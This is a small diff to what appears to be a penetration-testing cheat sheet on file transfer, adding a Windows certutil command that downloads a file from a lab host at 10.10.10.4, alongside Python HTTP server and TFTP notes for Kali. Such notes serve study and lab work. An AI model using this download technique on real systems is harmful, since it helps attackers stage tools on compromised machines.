@@ -14,6 +14,9 @@
     python -m SimpleHTTPServer [PORT] 
   ```
 ## Windows
+```bat
+certutil.exe -urlcache -f http://10.10.10.4/file.txt file.txt
+```
 - TFTP
   - Kali installation
   ```bash
